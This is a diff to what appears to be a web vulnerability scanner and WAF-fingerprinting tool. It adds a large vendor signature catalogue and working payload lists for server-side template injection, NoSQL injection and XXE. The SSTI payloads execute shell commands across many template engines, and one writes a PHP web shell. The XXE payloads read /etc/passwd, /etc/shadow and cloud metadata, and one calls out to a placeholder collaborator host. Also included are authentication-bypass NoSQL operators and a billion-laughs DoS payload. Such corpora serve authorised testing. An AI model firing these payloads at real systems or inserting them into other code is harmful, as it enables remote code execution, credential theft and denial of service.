@@ -46,6 +46,10 @@ INITIAL_PROBES = {
     "Command Injection": "; id",
     "LFI":               "../../../etc/passwd",
     "SSRF":              "http://127.0.0.1/",
+    # New types — WAFs have near-zero rules for these syntaxes
+    "SSTI":              "{{7*7}}",
+    "NoSQL Injection":   "[$ne]=1",
+    "XXE":               "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
 }
 
 PAYLOADS = {
@@ -1424,6 +1428,169 @@ PAYLOADS = {
         "dict://127.0.0.1:11211/",
         "ftp://127.0.0.1/",
     ],
+
+    # ════════════════════════════════════════════════════════════════════════
+    #   SERVER-SIDE TEMPLATE INJECTION (SSTI)
+    #   Polyglot probes that evaluate math across multiple template engines.
+    #   Detection: inject computation, look for the evaluated result (49).
+    #   Uses a unique large product to minimize false positives.
+    # ════════════════════════════════════════════════════════════════════════
+    "SSTI": [
+        # ── Polyglot numeric probe (works in Jinja2/Twig/Smarty/Velocity/Mako)
+        "{{7*7}}",
+        "${7*7}",
+        "#{7*7}",
+        "@(7*7)",
+        "%{7*7}",
+        "<%= 7*7 %>",
+        "${{7*7}}",
+        # ── Unique large product (near-zero false positive rate) ──────────────
+        "{{2413413*4342737}}",
+        "${2413413*4342737}",
+        "#{2413413*4342737}",
+        # ── Jinja2 / Flask specific ───────────────────────────────────────────
+        "{{config}}",
+        "{{config.items()}}",
+        "{{''.__class__.__mro__[1].__subclasses__()}}",
+        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
+        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
+        # ── Jinja2 sandbox escape via subclasses ──────────────────────────────
+        "{{''.__class__.mro()[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}",
+        "{{cycler.__init__.__globals__.os.popen('id').read()}}",
+        "{{joiner.__init__.__globals__.os.popen('id').read()}}",
+        "{{namespace.__init__.__globals__.os.popen('id').read()}}",
+        # ── Twig (PHP) ────────────────────────────────────────────────────────
+        "{{7*'7'}}",
+        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
+        "{{_self.env.enableDebug()}}{{_self.env.isDebug()}}",
+        "{{'id'|filter('system')}}",
+        "{{['id']|map('passthru')}}",
+        "{{app.request.server.get('HTTP_HOST')}}",
+        # ── Freemarker (Java) ─────────────────────────────────────────────────
+        "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
+        "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
+        "<#assign classLoader=object?api.class.protectionDomain.classLoader>"
+        "<#assign owc=classLoader.loadClass(\"freemarker.template.ObjectWrapper\")>"
+        "<#assign dwf=owc.getField(\"DEFAULT_WRAPPER\").get(null)>"
+        "<#assign ec=classLoader.loadClass(\"freemarker.template.utility.Execute\")>"
+        "${dwf.newInstance(ec,null)(\"id\")}",
+        # ── Velocity (Java) ───────────────────────────────────────────────────
+        "#set($str=$class.inspect(\"java.lang.String\").type)"
+        "#set($chr=$class.inspect(\"java.lang.Character\").type)"
+        "#set($ex=$class.inspect(\"java.lang.Runtime\").type.getRuntime().exec(\"id\"))"
+        "$ex.waitFor()"
+        "#set($out=$ex.getInputStream())"
+        "#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end",
+        "#set($x='')"
+        "#set($rt=$x.class.forName('java.lang.Runtime'))"
+        "#set($ex=$rt.getRuntime().exec('id'))"
+        "$ex.waitFor()"
+        "#set($out=$ex.getInputStream())"
+        "#foreach($i in [1..$out.available()])$x.class.forName('java.lang.String').valueOf($x.class.forName('java.lang.Character').toChars($out.read()))#end",
+        # ── Ruby ERB ──────────────────────────────────────────────────────────
+        "<%= system('id') %>",
+        "<%= `id` %>",
+        "<% require 'open3' %><%= Open3.capture2('id')[0] %>",
+        "#{system('id')}",
+        # ── Smarty (PHP) ──────────────────────────────────────────────────────
+        "{php}echo `id`;{/php}",
+        "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php passthru($_GET['cmd']); ?>\",self::clearConfig())}",
+        "{system('id')}",
+        # ── Pebble (Java) ────────────────────────────────────────────────────
+        "{%import java%}{{java.lang.Runtime.getRuntime().exec('id')}}",
+        # ── Mako (Python) ────────────────────────────────────────────────────
+        "${__import__('os').popen('id').read()}",
+        "<%\nimport os\nx=os.popen('id').read()\n%>${x}",
+        # ── Razor (.NET) ─────────────────────────────────────────────────────
+        "@(7*7)",
+        "@{var x = System.Diagnostics.Process.Start(\"cmd\", \"/c id\");}",
+        # ── Expression Language (Java EE) ─────────────────────────────────────
+        "${applicationScope}",
+        "${pageContext.request.servletContext.classLoader.loadClass('java.lang.Runtime').getMethod('exec',''.class).invoke(pageContext.request.servletContext.classLoader.loadClass('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')}",
+        "#{7*7}",
+        "T(java.lang.Runtime).getRuntime().exec('id')",
+    ],
+
+    # ════════════════════════════════════════════════════════════════════════
+    #   NoSQL INJECTION
+    #   MongoDB-style operator injection and HTTP parameter pollution.
+    #   WAFs tuned for SQL rarely inspect JSON operator keys.
+    # ════════════════════════════════════════════════════════════════════════
+    "NoSQL Injection": [
+        # ── MongoDB HTTP parameter pollution ($ne, $gt, $regex) ───────────────
+        "[$ne]=1",
+        "[$gt]=",
+        "[$lt]=zzzz",
+        "[$regex]=.*",
+        "[$exists]=true",
+        "[$type]=2",
+        "[$in][]=admin",
+        "[$nin][]=x",
+        "[$where]=this.password.match(/.*/)//",
+        "[$where]=1==1",
+        "[$where]=sleep(5000)",
+        # ── JSON body payloads (used when Content-Type is application/json) ───
+        "{\"$gt\": \"\"}",
+        "{\"$ne\": null}",
+        "{\"$regex\": \".*\"}",
+        "{\"$where\": \"1==1\"}",
+        "{\"$where\": \"sleep(3000)\"}",
+        "{\"username\": {\"$ne\": \"x\"}, \"password\": {\"$ne\": \"x\"}}",
+        "{\"username\": {\"$gt\": \"\"}, \"password\": {\"$gt\": \"\"}}",
+        "{\"username\": {\"$regex\": \"^admin\"}, \"password\": {\"$regex\": \".*\"}}",
+        "{\"username\": \"admin\", \"password\": {\"$ne\": \"invalid\"}}",
+        # ── JavaScript injection via $where ────────────────────────────────────
+        "{\"$where\": \"function(){return true}\"}",
+        "{\"$where\": \"function(){while(1){}}\"}",
+        "{\"$where\": \"function(){return this.username=='admin'}\"}",
+        # ── Array injection ────────────────────────────────────────────────────
+        "{\"username\": {\"$in\": [\"admin\", \"administrator\", \"root\"]}}",
+        # ── Time-based blind ──────────────────────────────────────────────────
+        "{\"$where\": \"this.x==1?true:function(){sleep(3000)}()\"}",
+        "' ; sleep(3000) ; '",
+        "' ; return true ; '",
+        # ── CouchDB/RethinkDB ──────────────────────────────────────────────────
+        "[\"admin\",\"admin\"]",
+        "true, $where: '1==1'",
+        "', $where: '1==1",
+        # ── Redis injection ────────────────────────────────────────────────────
+        "\\r\\nSET x 1\\r\\n",
+        "\\r\\nFLUSHALL\\r\\n",
+        "\\r\\nINFO\\r\\n",
+        # ── Elasticsearch ─────────────────────────────────────────────────────
+        "{\"query\":{\"match_all\":{}}}",
+        "{\"query\":{\"bool\":{\"must\":[{\"match_all\":{}}]}}}",
+    ],
+
+    # ════════════════════════════════════════════════════════════════════════
+    #   XXE — XML External Entity
+    #   Effective when Content-Type is text/xml or application/xml, or when
+    #   the backend parses XML from form fields / file uploads.
+    # ════════════════════════════════════════════════════════════════════════
+    "XXE": [
+        # ── Classic file read ─────────────────────────────────────────────────
+        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
+        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><foo>&xxe;</foo>",
+        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/shadow\">]><foo>&xxe;</foo>",
+        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///proc/self/environ\">]><foo>&xxe;</foo>",
+        # ── SSRF via XXE ──────────────────────────────────────────────────────
+        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://127.0.0.1/\">]><foo>&xxe;</foo>",
+        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><foo>&xxe;</foo>",
+        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://metadata.google.internal/computeMetadata/v1/\">]><foo>&xxe;</foo>",
+        # ── Blind XXE via OOB (Burp Collaborator placeholder) ─────────────────
+        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://YOUR.BURP.COLLABORATOR.HOST/\"> %xxe; ]><foo>test</foo>",
+        # ── PHP filter wrapper ────────────────────────────────────────────────
+        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/read=convert.base64-encode/resource=/etc/passwd\">]><foo>&xxe;</foo>",
+        # ── Error-based / blind local file include ────────────────────────────
+        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'file:///dev/null?%file;'>\"> %eval; %exfil; ]><foo>test</foo>",
+        # ── XInclude (when DOCTYPE is blocked) ───────────────────────────────
+        "<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include href=\"file:///etc/passwd\" parse=\"text\"/></foo>",
+        "<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include href=\"http://127.0.0.1/\"/></foo>",
+        # ── SVG XXE (image upload vector) ─────────────────────────────────────
+        "<?xml version=\"1.0\" standalone=\"yes\"?><!DOCTYPE test [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><svg width=\"128px\" height=\"128px\" xmlns=\"http://www.w3.org/2000/svg\"><text font-size=\"16\" x=\"0\" y=\"16\">&xxe;</text></svg>",
+        # ── Billion laughs (DoS probe) ────────────────────────────────────────
+        "<?xml version=\"1.0\"?><!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\"><!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">]><lolz>&lol3;</lolz>",
+    ],
 }
 
 # ═══════════════════════════════════════════════════════════════════════════════
@@ -1747,13 +1914,27 @@ SQLI_PAYLOAD_SEEDS = _load_ext_sqli_seeds()
 #   WAF DETECTION SIGNATURES
 # ═══════════════════════════════════════════════════════════════════════════════
 
-WAF_STATUS_CODES = {400, 403, 406, 419, 429, 503}
+WAF_STATUS_CODES = {
+    400, 403, 406, 419, 429, 503,
+    405,   # Aliyundun, Anquanbao, Tencent Cloud WAF
+    493,   # 360 (Qihoo) WAF proprietary status
+    999,   # WebKnight "No Hacking" / "Hack Not Found"
+}
 
 WAF_BODY_PATTERNS = [
     r"forbidden",
     r"blocked",
     r"access denied",
     r"request rejected",
+    # F5 BIG-IP ASM — returns 200 OK with a rejection HTML page.
+    # "request rejected" above does NOT match "requested url was rejected" —
+    # different word order, so these explicit F5 patterns are required.
+    r"requested url was rejected",
+    r"your support id is",
+    r"your support id is:\s*\d+",
+    r"please consult with your administrator",
+    r"<title>request rejected</title>",
+    # end F5 BIG-IP ASM specifics
     r"detected as attack",
     r"request has been blocked",
     r"your ip.*(?:has been|is) blocked",
@@ -1780,6 +1961,36 @@ WAF_BODY_PATTERNS = [
     r"security check",
     r"ddos protection",
     r"please wait.*verifying",
+    # F5 BIG-IP ASM (200 OK block page — "request rejected" alone doesn't match
+    # because F5 uses "requested url was rejected", different word order)
+    r"requested url was rejected",
+    r"your support id is",
+    r"please consult with your administrator",
+    # Imperva Incapsula — incident ID in block page
+    r"incapsula incident id",
+    r"_incapsula_resource",
+    # New / extended vendor catch-alls from waf.txt
+    r"this request has been blocked by website protection",
+    r"this request has been blocked by.*firewall",
+    r"unauthorized activity has been detected",
+    r"condition intercepted",
+    r"dotdefender blocked your request",
+    r"security check by bitninja",
+    r"visitor anti-robot validation",
+    r"pardon our interruption",
+    r"request forbidden by administrative rules",
+    r"detected as attack",
+    r"virus/spyware download blocked",
+    r"request denied by watchguard firewall",
+    r"generated by wordfence",
+    r"ninjafirewall.*forbidden",
+    r"senginx-robot-mitigation",
+    r"powered by utm web protection",
+    r"perimeterx\.com/whywasiblocked",
+    r"your access has been intercepted",
+    r"this request has been blocked by naxsi",
+    r"sorry, this is not allowed",
+    r"suspicious activity detected\. access to the site is blocked",
 ]
 
 # ── Per-vendor WAF fingerprint signatures ─────────────────────────────────────
@@ -1809,10 +2020,21 @@ WAF_VENDOR_SIGNATURES = {
         "status":  {403, 406},
     },
     "f5": {
-        "headers": [r"^ts[0-9a-f]{8,}", r"x-waf-status", r"server:\s*bigip"],
-        "body":    [r"the requested url was rejected", r"f5\s+big.?ip",
-                    r"support id:", r"please consult.*support id"],
-        "status":  {403},
+        "headers": [r"^ts[0-9a-f]{8,}", r"x-waf-status", r"server:\s*bigip",
+                    r"x-cnection", r"^ts[0-9a-f]{8,}=[0-9a-f]{8,};"],
+        "body":    [r"the requested url was rejected",
+                    r"requested url was rejected",
+                    r"f5\s+big.?ip",
+                    r"your support id is",
+                    r"your support id is:\s*\d+",
+                    r"support id:",
+                    r"please consult with your administrator",
+                    r"please consult.*support id",
+                    r"<title>request rejected</title>"],
+        # F5 BIG-IP ASM returns 200 OK (not 403) for rejection pages —
+        # the block page is served as a normal HTTP 200 response with a
+        # rejection HTML body + unique numeric support ID per blocked request.
+        "status":  {200, 403},
     },
     "akamai": {
         "headers": [r"x-check-cacheable", r"akamai-grn",
@@ -1841,9 +2063,740 @@ WAF_VENDOR_SIGNATURES = {
         "status":  {403},
     },
     "fortinet": {
-        "headers": [r"x-fw-", r"server:\s*fortigate", r"fortiwebsessid"],
+        "headers": [r"x-fw-", r"server:\s*fortigate", r"fortiwebsessid",
+                    r"fortiwafsid="],
         "body":    [r"fortigate", r"fortiweb", r"fortinet",
-                    r"your request was blocked by fortiweb"],
+                    r"your request was blocked by fortiweb",
+                    r"\.fgd_icon", r"server unavailable\. please visit later"],
+        "status":  {403},
+    },
+    # ── Extended vendor catalogue from waf.txt reference ─────────────────────────
+    "360_qihoo": {
+        "headers": [r"x-powered-by-360wzb", r"wzws-ray", r"server:\s*qianxin-waf"],
+        "body":    [r"wzws-waf-cgi", r"wangshan\.360\.cn",
+                    r"your access has been intercepted because your links may threaten"],
+        "status":  {493},
+    },
+    "aesecure": {
+        "headers": [r"aesecure-code"],
+        "body":    [r"aesecure_denied\.png"],
+        "status":  {403},
+    },
+    "airlock": {
+        "headers": [r"set-cookie:.*\bal-sess\b", r"set-cookie:.*\bal-lb\b"],
+        "body":    [r"server detected a syntax error in your request",
+                    r"check your request and all parameters"],
+        "status":  {400, 403},
+    },
+    "alert_logic": {
+        "headers": [],
+        "body":    [r"we are sorry, but the page you are looking for cannot be found",
+                    r"the page has either been removed, renamed or temporarily unavailable"],
+        "status":  {404},
+    },
+    "aliyundun": {
+        "headers": [],
+        "body":    [r"sorry, your request has been blocked as it may cause potential threats",
+                    r"errors\.aliyun\.com"],
+        "status":  {405},
+    },
+    "anquanbao": {
+        "headers": [r"x-powered-by-anquanbao"],
+        "body":    [r"/aqb_cc/error/", r"hidden_intercept_time"],
+        "status":  {405},
+    },
+    "anyu": {
+        "headers": [r"wzws-ray"],
+        "body":    [r"your access has been intercepted by anyu",
+                    r"anyu.*the green channel"],
+        "status":  {403},
+    },
+    "approach": {
+        "headers": [r"server:\s*approach"],
+        "body":    [r"approach web application firewall framework",
+                    r"your ip address has been logged.*track",
+                    r"approach infrastructure team"],
+        "status":  {403},
+    },
+    "armor_defense": {
+        "headers": [],
+        "body":    [r"this request has been blocked by website protection from armor",
+                    r"if you manage this domain please create an armor support ticket"],
+        "status":  {403},
+    },
+    "arvancloud": {
+        "headers": [r"server:\s*arvancloud"],
+        "body":    [],
+        "status":  {403},
+    },
+    "aspa_waf": {
+        "headers": [r"server:\s*aspa-waf", r"aspa-cache-status"],
+        "body":    [],
+        "status":  {403},
+    },
+    "astra": {
+        "headers": [r"set-cookie:.*cz_astra_csrf_cookie"],
+        "body":    [r"sorry, this is not allowed",
+                    r"our website protection system has detected an issue",
+                    r"getastra\.com"],
+        "status":  {403},
+    },
+    "aws_elb": {
+        "headers": [r"set-cookie:.*awsalb", r"x-amz-id", r"x-amz-request-id",
+                    r"server:\s*awselb"],
+        "body":    [r"access denied", r"<requestid>[a-z0-9]{20,25}</requestid>"],
+        "status":  {403},
+    },
+    "baidu_yunjiasu": {
+        "headers": [r"server:\s*yunjiasu"],
+        "body":    [],
+        "status":  {403},
+    },
+    "barikode": {
+        "headers": [],
+        "body":    [r"\bbarikode\b", r"forbidden access"],
+        "status":  {403},
+    },
+    "bekchy": {
+        "headers": [r"bekchy.*access denied"],
+        "body":    [r"bekchy\.com/report"],
+        "status":  {403},
+    },
+    "binarysec": {
+        "headers": [r"x-binarysec-via", r"x-binarysec-nocache",
+                    r"server:\s*binarysec"],
+        "body":    [],
+        "status":  {403},
+    },
+    "bitninja": {
+        "headers": [],
+        "body":    [r"security check by bitninja",
+                    r"your ip will be removed from bitninja",
+                    r"visitor anti-robot validation"],
+        "status":  {403},
+    },
+    "blockdos": {
+        "headers": [r"server:\s*blockdos\.net"],
+        "body":    [],
+        "status":  {403},
+    },
+    "bluedon": {
+        "headers": [r"server:\s*bdwaf"],
+        "body":    [r"bluedon web application firewall"],
+        "status":  {403},
+    },
+    "bulletproof_security": {
+        "headers": [],
+        "body":    [r"id=[\"']?bpsmessage[\"']?",
+                    r"if you arrived here due to a search or clicking on a link"],
+        "status":  {403},
+    },
+    "cdnns_gateway": {
+        "headers": [],
+        "body":    [r"cdnns\s*waf\s*application\s*gateway",
+                    r"cdnnswaf application gateway"],
+        "status":  {403},
+    },
+    "cerber": {
+        "headers": [],
+        "body":    [r"we.re sorry, you are not allowed to proceed",
+                    r"your request looks suspicious or similar to automated requests"],
+        "status":  {403},
+    },
+    "chaitin_safeline": {
+        "headers": [],
+        "body":    [r"<!--.*event_id.*-->"],
+        "status":  {403},
+    },
+    "chinacache": {
+        "headers": [r"powered-by-chinacache"],
+        "body":    [],
+        "status":  {403},
+    },
+    "cloudbric": {
+        "headers": [],
+        "body":    [r"malicious code detected",
+                    r"your request was blocked by cloudbric",
+                    r"cloudbric\.zendesk\.com",
+                    r"<title>cloudbric\s*\|\s*error"],
+        "status":  {403},
+    },
+    "cloudfloordns": {
+        "headers": [r"server:\s*cloudfloordns\s*waf"],
+        "body":    [r"cloudfloordns.*web application firewall error",
+                    r"cloudfloordns\.com/contact"],
+        "status":  {403},
+    },
+    "cloudfront": {
+        "headers": [],
+        "body":    [r"generated by cloudfront"],
+        "status":  {403},
+    },
+    "comodo_cwatch": {
+        "headers": [r"server:\s*protected by comodo waf"],
+        "body":    [],
+        "status":  {403},
+    },
+    "crawlprotect": {
+        "headers": [r"set-cookie:.*crawlprotect"],
+        "body":    [r"this site is protected by crawlprotect"],
+        "status":  {403},
+    },
+    "deny_all": {
+        "headers": [r"set-cookie:.*sessioncookie"],
+        "body":    [r"condition intercepted"],
+        "status":  {403},
+    },
+    "distil": {
+        "headers": [r"x-distil-cs"],
+        "body":    [r"pardon our interruption",
+                    r"something about your browser made us think that you are a bot"],
+        "status":  {403},
+    },
+    "dosarrest": {
+        "headers": [r"x-dis-request-id", r"server:\s*dosarrest"],
+        "body":    [],
+        "status":  {403},
+    },
+    "dotdefender": {
+        "headers": [r"x-dotdefender-denied"],
+        "body":    [r"dotdefender blocked your request"],
+        "status":  {403},
+    },
+    "dynamicweb_injcheck": {
+        "headers": [r"x-403-status-by:\s*dw-inj-check"],
+        "body":    [],
+        "status":  {403},
+    },
+    "e3learning_security": {
+        "headers": [r"server:\s*e3learning_waf"],
+        "body":    [],
+        "status":  {403},
+    },
+    "edgecast": {
+        "headers": [],
+        "body":    [r"please contact the site administrator.*reference id.*edgecast",
+                    r"edgecast web application firewall.*verizon"],
+        "status":  {400},
+    },
+    "eisoo_cloud": {
+        "headers": [r"server:\s*eisoowaf", r"server:\s*eisoowaf-azure"],
+        "body":    [r"eisoo-firewall-block\.css", r"www\.eisoo\.com",
+                    r"eisoo\s+inc\."],
+        "status":  {403},
+    },
+    "godaddy": {
+        "headers": [],
+        "body":    [r"access denied.*godaddy website firewall"],
+        "status":  {403},
+    },
+    "greywizard": {
+        "headers": [r"server:\s*greywizard"],
+        "body":    [r"grey wizard",
+                    r"contact the website owner or grey wizard",
+                    r"we.ve detected attempted attack or non standard traffic"],
+        "status":  {403},
+    },
+    "huawei_cloud": {
+        "headers": [],
+        "body":    [r"account\.hwclouds\.com/static/error",
+                    r"www\.hwclouds\.com",
+                    r"hws_security@"],
+        "status":  {403},
+    },
+    "hyperguard": {
+        "headers": [r"set-cookie:.*\bodsession="],
+        "body":    [],
+        "status":  {403},
+    },
+    "ibm_datapower": {
+        "headers": [r"x-backside-transport"],
+        "body":    [],
+        "status":  {403},
+    },
+    "imunify360": {
+        "headers": [r"server:\s*imunify360-webshield"],
+        "body":    [r"powered by imunify360", r"protected by imunify360"],
+        "status":  {403},
+    },
+    "indusguard": {
+        "headers": [r"server:\s*if_waf", r"x-version"],
+        "body":    [r"further investigation and remediation with a screenshot"],
+        "status":  {403},
+    },
+    "instart_dx": {
+        "headers": [r"x-instart-request-id", r"x-instart-wl",
+                    r"x-instart-cache"],
+        "body":    [r"the requested url was rejected\. please consult with your administrator"],
+        "status":  {403},
+    },
+    "isa_server": {
+        "headers": [],
+        "body":    [r"the isa server denied the specified uniform resource locator",
+                    r"contact the server administrator"],
+        "status":  {403},
+    },
+    "janusec": {
+        "headers": [],
+        "body":    [r"janusec application gateway"],
+        "status":  {403},
+    },
+    "jiasule": {
+        "headers": [r"server:\s*jiasule-waf",
+                    r"set-cookie:.*__jsluid=", r"set-cookie:.*jsl_tracking"],
+        "body":    [r"static\.jiasule\.com", r"notice-jiasule"],
+        "status":  {403},
+    },
+    "keycdn": {
+        "headers": [r"server:\s*keycdn"],
+        "body":    [],
+        "status":  {403},
+    },
+    "knownsec": {
+        "headers": [],
+        "body":    [r"ks-waf-error\.png"],
+        "status":  {403},
+    },
+    "litespeed": {
+        "headers": [r"server:\s*litespeed"],
+        "body":    [r"proudly powered by litespeed",
+                    r"litespeedtech\.com/error-page",
+                    r"access to resource on this server is denied"],
+        "status":  {403},
+    },
+    "malcare": {
+        "headers": [],
+        "body":    [r"blocked because of malicious activities",
+                    r"firewall powered by malcare"],
+        "status":  {403},
+    },
+    "mission_control": {
+        "headers": [r"server:\s*mission control application shield"],
+        "body":    [],
+        "status":  {403},
+    },
+    "naxsi": {
+        "headers": [r"x-data-origin:\s*naxsi/waf",
+                    r"server:\s*naxsi"],
+        "body":    [r"this request has been blocked by naxsi"],
+        "status":  {403},
+    },
+    "nemesida": {
+        "headers": [],
+        "body":    [r"suspicious activity detected\. access to the site is blocked",
+                    r"nwaf@"],
+        "status":  {403},
+    },
+    "netcontinuum": {
+        "headers": [r"set-cookie:.*nci__sessionid="],
+        "body":    [],
+        "status":  {403},
+    },
+    "netscaler_appfirewall": {
+        "headers": [r"nncoection", r"set-cookie:.*ns_af=",
+                    r"set-cookie:.*citrix_ns_id", r"set-cookie:.*\bnsc_",
+                    r"ns-cache"],
+        "body":    [],
+        "status":  {403},
+    },
+    "nevisproxy": {
+        "headers": [r"set-cookie:.*navajo"],
+        "body":    [],
+        "status":  {403},
+    },
+    "newdefend": {
+        "headers": [r"server:\s*newdefend"],
+        "body":    [r"newdefend\.com/feedback", r"/nd_block/"],
+        "status":  {403},
+    },
+    "nexusguard": {
+        "headers": [],
+        "body":    [r"speresources\.nexusguard\.com"],
+        "status":  {403},
+    },
+    "ninjafirewall": {
+        "headers": [],
+        "body":    [r"for security reasons, it was blocked and logged",
+                    r"ninjafirewall:\s*403 forbidden"],
+        "status":  {403},
+    },
+    "nsfocus": {
+        "headers": [r"server:\s*nsfocus"],
+        "body":    [],
+        "status":  {403},
+    },
+    "nullddos": {
+        "headers": [r"server:\s*nullddos\s*system"],
+        "body":    [],
+        "status":  {403},
+    },
+    "onmessage_shield": {
+        "headers": [r"x-engine:\s*onmessage\s*shield"],
+        "body":    [r"blackbaud\s*k-12",
+                    r"https://status\.blackbaud\.com",
+                    r"https://maintenance\.blackbaud\.com"],
+        "status":  {403},
+    },
+    "openresty_lua_waf": {
+        "headers": [r"server:\s*openresty"],
+        "body":    [r"openresty/"],
+        "status":  {406},
+    },
+    "palo_alto": {
+        "headers": [],
+        "body":    [r"virus/spyware download blocked",
+                    r"palo alto next generation security platform"],
+        "status":  {403},
+    },
+    "pentawaf": {
+        "headers": [r"server:\s*pentawaf"],
+        "body":    [r"pentawaf/"],
+        "status":  {403},
+    },
+    "perimeterx": {
+        "headers": [],
+        "body":    [r"perimeterx\.com/whywasiblocked"],
+        "status":  {403},
+    },
+    "pkSecurityModule": {
+        "headers": [],
+        "body":    [r"pksecuritymodule.*security\.alert",
+                    r"a safety critical request was discovered and blocked"],
+        "status":  {403},
+    },
+    "positive_tech_af": {
+        "headers": [],
+        "body":    [r"request id:.*\d{4}-\d{2}-\d{2}-\d{2}-\d{2}-\d{2}"],
+        "status":  {403},
+    },
+    "powercdn": {
+        "headers": [r"via:.*powercdn\.com", r"x-cache:.*powercdn\.com",
+                    r"x-cdn:\s*powercdn"],
+        "body":    [],
+        "status":  {403},
+    },
+    "profense": {
+        "headers": [r"server:\s*profense", r"set-cookie:.*plbsid="],
+        "body":    [],
+        "status":  {403},
+    },
+    "proventia_ibm": {
+        "headers": [],
+        "body":    [r"request does not match proventia rules"],
+        "status":  {403},
+    },
+    "puhui": {
+        "headers": [r"server:\s*puhuiwaf"],
+        "body":    [],
+        "status":  {403},
+    },
+    "qiniu_cdn": {
+        "headers": [r"x-qiniu-cdn"],
+        "body":    [],
+        "status":  {403},
+    },
+    "radware_appwall": {
+        "headers": [r"x-sl-compstate"],
+        "body":    [r"unauthorized activity has been detected",
+                    r"case\s+number",
+                    r"radwarealerting@",
+                    r"<title>unauthorized request blocked</title>"],
+        "status":  {403},
+    },
+    "reblaze": {
+        "headers": [r"server:\s*reblaze", r"set-cookie:.*rbzid="],
+        "body":    [r"access denied.*\(403\)",
+                    r"current session has been terminated"],
+        "status":  {403},
+    },
+    "request_validation_mode": {
+        "headers": [r"x-powered-by:\s*asp\.net"],
+        "body":    [r"asp\.net has detected data in the request that is potentially dangerous",
+                    r"request validation has detected a potentially dangerous client input value",
+                    r"httprequestvalidationexception"],
+        "status":  {500},
+    },
+    "rsfirewall": {
+        "headers": [],
+        "body":    [r"com_rsfirewall_403_forbidden", r"com_rsfirewall_event"],
+        "status":  {403},
+    },
+    "sabre": {
+        "headers": [],
+        "body":    [r"dxsupport@sabre\.com", r"your request has been blocked"],
+        "status":  {500},
+    },
+    "safe3": {
+        "headers": [r"x-powered-by:\s*safe3waf",
+                    r"server:\s*safe3 web firewall"],
+        "body":    [r"safe3waf"],
+        "status":  {403},
+    },
+    "safedog": {
+        "headers": [r"server:\s*waf/2\.0", r"server:\s*safedog"],
+        "body":    [],
+        "status":  {403},
+    },
+    "secking": {
+        "headers": [r"server:\s*seckingwaf", r"server:\s*secking/"],
+        "body":    [],
+        "status":  {403},
+    },
+    "secupress": {
+        "headers": [],
+        "body":    [r"secupress", r"block id:.*bad url contents"],
+        "status":  {503},
+    },
+    "secure_entry": {
+        "headers": [r"server:\s*secure entry server",
+                    r"secure entry server"],
+        "body":    [],
+        "status":  {403},
+    },
+    "secureiis": {
+        "headers": [],
+        "body":    [r"download\s+secureiis\s+personal\s+edition",
+                    r"eeye\.com/secureiis",
+                    r"secureiis\s+error"],
+        "status":  {403},
+    },
+    "senginx": {
+        "headers": [],
+        "body":    [r"senginx-robot-mitigation"],
+        "status":  {403},
+    },
+    "serverdefender_vp": {
+        "headers": [r"x-pint:\s*p80"],
+        "body":    [],
+        "status":  {403},
+    },
+    "shadow_daemon": {
+        "headers": [],
+        "body":    [r"request forbidden by administrative rules"],
+        "status":  {403},
+    },
+    "shield_security": {
+        "headers": [],
+        "body":    [r"you were blocked by the shield",
+                    r"something in the url, form or cookie data wasn.t appropriate"],
+        "status":  {403},
+    },
+    "siteground": {
+        "headers": [],
+        "body":    [r"the page you are trying to access is restricted due to a security rule"],
+        "status":  {403},
+    },
+    "siteguard_jp": {
+        "headers": [],
+        "body":    [r"powered by siteguard",
+                    r"the server refuse to browse the page"],
+        "status":  {403},
+    },
+    "sitelock_trueshield": {
+        "headers": [],
+        "body":    [r"www\.sitelock\.com",
+                    r"sitelock is leader in business website security",
+                    r"sitelock_shield_logo"],
+        "status":  {403},
+    },
+    "sonicwall": {
+        "headers": [r"server:\s*sonicwall"],
+        "body":    [r"this request is blocked by the sonicwall",
+                    r"web site blocked",
+                    r"nsa_banner"],
+        "status":  {403},
+    },
+    "sophos_utm": {
+        "headers": [],
+        "body":    [r"powered by utm web protection"],
+        "status":  {403},
+    },
+    "squidproxy_ids": {
+        "headers": [r"server:\s*squid/"],
+        "body":    [r"access control configuration prevents your request"],
+        "status":  {403},
+    },
+    "stackpath": {
+        "headers": [],
+        "body":    [r"you performed an action that triggered the service and blocked your request"],
+        "status":  {403},
+    },
+    "stingray": {
+        "headers": [r"x-mapping"],
+        "body":    [],
+        "status":  {403, 500},
+    },
